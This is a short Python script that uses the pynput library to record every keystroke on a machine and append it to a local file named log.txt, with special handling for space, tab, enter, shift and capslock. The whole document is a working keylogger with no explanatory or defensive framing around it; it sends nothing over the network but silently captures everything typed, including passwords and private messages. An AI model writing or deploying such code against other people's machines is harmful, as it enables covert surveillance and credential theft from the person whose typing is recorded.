from pynput.keyboard import Listener

count = 0
keys = []

def on_press(key):
    global count, keys
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys=[]

def write_file(key):
    with open("log.txt", "a") as f:
        for key in keys:
            k= str(key).replace("'","")
            if k.find("space") > 0: 
                f.write(' ') 
            elif k.find('tab') > 0:
                f.write('  ')
            elif k.find("enter") > 0:
                f.write('\n') 
            elif k.find("shift") > 0:
                 f.write(' shift ')
            elif k.find("capslock") > 0:    
                f.write(' capslock ')

            elif k.find ("key") == -1:
                f.write(k)
                                
                

     
with Listener (on_press=on_press) as listener:
    listener.join()    